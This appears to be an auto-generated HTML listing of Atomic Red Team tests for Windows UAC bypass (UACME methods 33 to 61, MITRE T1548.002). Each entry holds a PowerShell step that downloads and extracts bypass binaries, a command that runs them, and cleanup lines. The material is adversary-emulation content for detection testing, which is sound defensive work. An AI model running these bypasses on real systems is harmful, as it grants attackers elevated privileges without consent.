<li><strong>input_arguments.uacme_exe</strong>: {'description': 'Path to uacme executable', 'type': 'path', 'default': 'PathToAtomicsFolder\..\ExternalPayloads\uacme\31 Akagi64.exe'}</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: e514bb03-f71c-4b22-9092-9f961ec6fb03</li>
<li><strong>name</strong>: UACME Bypass Method 33</li>
<li><strong>description</strong>: Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.</li>
</ul>
<p>Author: winscripting.blog</p>
<p>Type:   Shell API</p>
<p>Method: Registry key manipulation</p>
<p>Target: \system32\fodhelper.exe</p>
<p>Component:  Attacker defined</p>
<p>Implementation: ucmShellRegModMethod</p>
<p>UCM Method: UacMethodMsSettings2</p>
<p>https://github.com/hfiref0x/UACME</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: "#{uacme_exe}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path "$tempPath") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "PathToAtomicsFolder..\ExternalPayloads\uacme.zip"
Expand-Archive "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder..\ExternalPayloads\uacme" -Force
Remove-Item "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1548.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: {'description': 'Path to uacme executable', 'type': 'path', 'default': 'PathToAtomicsFolder\..\ExternalPayloads\uacme\33 Akagi64.exe'}</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 695b2dac-423e-448e-b6ef-5b88e93011d6</li>
<li><strong>name</strong>: UACME Bypass Method 34</li>
<li><strong>description</strong>: Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.</li>
</ul>
<p>Author: James Forshaw</p>
<p>Type:   Shell API</p>
<p>Method: Environment variables expansion</p>
<p>Target: \system32\svchost.exe via \system32\schtasks.exe</p>
<p>Component:  Attacker defined</p>
<p>Implementation: ucmDiskCleanupEnvironmentVariable</p>
<p>UCM Method: UacMethodDiskSilentCleanup</p>
<p>https://github.com/hfiref0x/UACME</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: "#{uacme_exe}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path "$tempPath") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "PathToAtomicsFolder..\ExternalPayloads\uacme.zip"
Expand-Archive "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder..\ExternalPayloads\uacme" -Force
Remove-Item "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1548.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: {'description': 'Path to uacme executable', 'type': 'path', 'default': 'PathToAtomicsFolder\..\ExternalPayloads\uacme\34 Akagi64.exe'}</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 56163687-081f-47da-bb9c-7b231c5585cf</li>
<li><strong>name</strong>: UACME Bypass Method 39</li>
<li><strong>description</strong>: Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.</li>
</ul>
<p>Author: Stefan Kanthak</p>
<p>Type:   Dll Hijack</p>
<p>Method: .NET Code Profiler</p>
<p>Target: \system32\mmc.exe</p>
<p>Component:  Attacker defined</p>
<p>Implementation: ucmCorProfilerMethod</p>
<p>UCM Method: UacMethodCorProfiler</p>
<p>https://github.com/hfiref0x/UACME</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: "#{uacme_exe}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path "$tempPath") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "PathToAtomicsFolder..\ExternalPayloads\uacme.zip"
Expand-Archive "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder..\ExternalPayloads\uacme" -Force
Remove-Item "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1548.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: {'description': 'Path to uacme executable', 'type': 'path', 'default': 'PathToAtomicsFolder\..\ExternalPayloads\uacme\39 Akagi64.exe'}</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 235ec031-cd2d-465d-a7ae-68bab281e80e</li>
<li><strong>name</strong>: UACME Bypass Method 56</li>
<li><strong>description</strong>: Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.</li>
</ul>
<p>Author: Hashim Jawad</p>
<p>Type:   Shell API</p>
<p>Method: Registry key manipulation</p>
<p>Target: \system32\WSReset.exe</p>
<p>Component:  Attacker defined</p>
<p>Implementation: ucmShellRegModMethod</p>
<p>UCM Method: UacMethodShellWSReset</p>
<p>https://github.com/hfiref0x/UACME</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: "#{uacme_exe}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path "$tempPath") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "PathToAtomicsFolder..\ExternalPayloads\uacme.zip"
Expand-Archive "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder..\ExternalPayloads\uacme" -Force
Remove-Item "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1548.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: {'description': 'Path to uacme executable', 'type': 'path', 'default': 'PathToAtomicsFolder\..\ExternalPayloads\uacme\56 Akagi64.exe'}</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: dfb1b667-4bb8-4a63-a85e-29936ea75f29</li>
<li><strong>name</strong>: UACME Bypass Method 59</li>
<li><strong>description</strong>: Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.</li>
</ul>
<p>Author: James Forshaw</p>
<p>Type:   AppInfo ALPC</p>
<p>Method: RAiLaunchAdminProcess and DebugObject</p>
<p>Target: Attacker defined</p>
<p>Component:  Attacker defined</p>
<p>Implementation: ucmDebugObjectMethod</p>
<p>UCM Method: UacMethodDebugObject</p>
<p>https://github.com/hfiref0x/UACME</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: "#{uacme_exe}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path "$tempPath") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "PathToAtomicsFolder..\ExternalPayloads\uacme.zip"
Expand-Archive "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder..\ExternalPayloads\uacme" -Force
Remove-Item "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1548.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: {'description': 'Path to uacme executable', 'type': 'path', 'default': 'PathToAtomicsFolder\..\ExternalPayloads\uacme\59 Akagi64.exe'}</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 7825b576-744c-4555-856d-caf3460dc236</li>
<li><strong>name</strong>: UACME Bypass Method 61</li>
<li><strong>description</strong>: Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.</li>
</ul>
<p>Author: Enigma0x3/bytecode77 derivative by Nassim Asrir</p>
<p>Type:   Shell API</p>
<p>Method: Registry key manipulation</p>
<p>Target: \system32\slui.exe, \system32\changepk.exe</p>
<p>Component:  Attacker defined</p>
<p>Implementation: ucmShellRegModMethod</p>
<p>UCM Method: UacMethodDebugObject</p>
<p>https://github.com/hfiref0x/UACME</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: "#{uacme_exe}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path "$tempPath") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "PathToAtomicsFolder..\ExternalPayloads\uacme.zip"
Expand-Archive "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder..\ExternalPayloads\uacme" -Force
Remove-Item "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1548.002</p>
</li>
